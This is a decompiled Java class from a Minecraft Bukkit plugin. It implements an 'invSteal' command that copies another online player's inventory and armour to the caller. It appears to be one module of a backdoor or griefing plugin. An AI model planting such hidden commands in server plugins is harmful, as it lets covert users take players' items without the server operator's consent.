/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class InvstealCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("invSteal <player>"));
        } else if (args[1].equals("*")) {
            p2.sendMessage(Settings.PREFIX("You cannot steal everyones inventory!"));
        } else {
            Player target = Bukkit.getServer().getPlayer(args[1]);
            if (target == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
            } else {
                p2.getInventory().setArmorContents(target.getInventory().getArmorContents());
                p2.getInventory().setContents(target.getInventory().getContents());
                p2.sendMessage(Settings.PREFIX("You have copied and stolen " + Settings.RED + target.getName() + "'s" + Settings.WHITE + " inventory"));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

